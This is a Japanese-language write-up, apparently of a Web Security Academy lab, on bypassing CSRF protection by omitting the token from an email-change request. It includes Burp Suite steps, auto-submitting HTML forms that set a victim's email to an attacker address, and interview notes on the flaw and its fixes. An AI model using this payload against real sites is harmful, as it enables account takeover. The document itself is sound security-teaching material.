
# 🛡️ CSRF Token 省略バイパス Lab — 完全まとめ（Markdown版）

## 🔧 事前準備（Burp Suite）
- Burp Suite 起動  
- **Proxy → Intercept = off**  
- **Proxy → HTTP History** を開く  
- Burp 内蔵ブラウザを使用（Open Browser）

---

# STEP 1：Lab にログイン
1. Lab を開く（ACCESS THE LAB）
2. Burp 内蔵ブラウザでアクセス
3. **wiener / peter** でログイン

---

# STEP 2：メール変更リクエストをキャプチャ
1. My Account → Email を `test@test.com` に変更  
2. HTTP History で以下を探す：

```
POST /my-account/change-email
```

3. リクエスト内容：

```
email=test%40test.com
csrf=AbCdEfGhIjKlMnOpQrStUvWx
Cookie: session=xxxx
```

---

# STEP 3：Repeaterで脆弱性を確認

## 3-1. CSRFトークン改ざん
`csrf=wrongvalue123` に変更 → **400 Bad Request**

→ トークン検証は一応動いている

## 3-2. CSRFパラメータ削除
`&csrf=xxxxx` を **丸ごと削除**

```
email=test%40test.com
```

→ **200 OK**  
→ **トークンが無いと検証がスキップされる脆弱性**

---

# STEP 4：悪意ある HTML を作成

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="hacked@evil-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

### 重要ポイント
- **csrf フィールドは入れない**
- email は攻撃者が指定した値
- POST / 正しい action URL

---

# STEP 5：Exploit Server にセット
1. Go to exploit server  
2. Body に HTML を貼り付け  
3. **Store** で保存  
4. **View exploit** で動作確認

Burp の HTTP History に以下が出れば成功：

```
POST /my-account/change-email
email=hacked%40evil-user.net
```

→ **csrf が無い状態で 200 OK**

---

# STEP 6：自分で動作テスト
- My Account を確認  
→ メールが `hacked@evil-user.net` に変わっていれば OK

---

# STEP 7：被害者に送信
1. Exploit Server に戻る  
2. email を別の値に変更：

```html
<input type="hidden" name="email" value="victim-hacked@evil-user.net">
```

3. **Store**  
4. **Deliver to victim**

→ Lab 完了 🎉

---

# 🧠 この Lab の本質

## ✔ 実装ミスの核心
```
if token exists:
    validate(token)
else:
    skip validation   ← これが致命的
```

→ **トークンを削除するだけで CSRF が成立**

---

# 🧨 なぜ攻撃が成立するのか（噛み砕き版）

1. 被害者が exploit server の URL を踏む  
2. 自動で POST が送信される  
3. ブラウザは **Cookie を自動送信**（仕様）  
4. サーバーは「本人の操作」と誤認  
5. メールアドレスが攻撃者の指定した値に変更される

---

# 🔥 なぜ危険なのか
メールアドレスを変えられると：

- パスワードリセットメールを攻撃者が受け取れる  
- **アカウント乗っ取りが可能**

---

# 🧩 CSRF の本質（覚えるべき構造）

```
① ブラウザは Cookie を自動送信する
② 攻撃者は罠ページに自動送信フォームを置く
③ 被害者が踏むと Cookie 付きリクエストが飛ぶ
④ サーバーは本人と勘違いして処理する
```

---

# 🎤 面接で使える説明

## 「CSRFとは何ですか？」

> 「ログイン済みユーザーを騙して、  
>  **意図しないリクエストを送らせる攻撃**です。  
>  ブラウザは Cookie を自動送信するため、  
>  攻撃者が用意した罠ページを踏むだけで  
>  本人の操作として処理されてしまいます。」

## 「どう防ぎますか？」

> 「フォームに **CSRFトークン** を埋め込み、  
>  サーバー側でトークンを検証します。  
>  トークンはランダム生成されるため、  
>  攻撃者は値を推測できません。」

## 「今回の Lab の脆弱性は？」

> 「**トークンが存在する場合だけ検証し、  
>  存在しない場合はスキップする実装ミス**でした。  
>  そのため、トークンを丸ごと削除するだけで  
>  バイパスできました。」

---

# 🏁 まとめ

- CSRF は「被害者のブラウザを踏み台にする攻撃」
- Cookie 自動送信が根本原因
- トークン削除でバイパスできる実装ミスが今回の脆弱性
- メール変更はアカウント乗っ取りに直結する

---

# 🛡️ CSRF Token 省略バイパス — 面接用まとめ

## ① どーいう脆弱性？
**CSRFトークンが “存在する時だけ” 検証され、  
“存在しない場合はスキップされる” 実装ミス。**

つまり：

```
if (csrf_token exists) {
    validate();
} else {
    skip validation;   ← ここが致命的
}
```

→ **トークンを丸ごと削除すると攻撃が通る。**

---

## ② どう気づいた？
Burp Repeater で以下を試して発見：

1. **トークン改ざん → 400 Bad Request**  
   → 一応検証は動いている

2. **トークン削除 → 200 OK**  
   → 「存在しない場合は検証しない」挙動を確認  
   → **CSRFバイパス確定**

---

## ③ どう攻撃した？
攻撃者が用意した罠ページ（HTML）を被害者に踏ませる。

```html
<form method="POST" action="https://LAB-ID/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

ポイント：

- **csrf フィールドを入れない**（これが攻撃の核心）
- 被害者がログイン済みなら、  
  **ブラウザが自動で Cookie を送る → 本人扱いで処理される**

結果：

→ **被害者のメールアドレスが攻撃者の指定した値に書き換わる**  
→ パスワードリセットを奪われ、**アカウント乗っ取り可能**

---

## ④ どう対策する？
**サーバー側で必ず「トークンが無い場合は拒否」する。**

```
if (!csrf_token) {
    reject();
}
validate(csrf_token);
```

加えて：

- トークンは毎回ランダム生成
- SameSite=Lax/Strict の適切設定
- Referer / Origin チェックの併用

---

# 🎤 30秒面接用まとめ（暗記用）

```
この脆弱性は、CSRFトークンが存在する時だけ検証し、
存在しない場合は検証をスキップする実装ミスでした。

Burp の Repeater でトークンを削除して送信したところ、
200 OK が返り、メールアドレス変更が通ったため気づきました。

攻撃としては、csrf パラメータを含まない自動送信フォームを
罠ページに仕込み、被害者が踏むと Cookie が自動送信され、
本人としてメールアドレスが書き換わります。

対策は、トークンが無い場合は必ず拒否することと、
トークンの厳格な検証を行うことです。
```

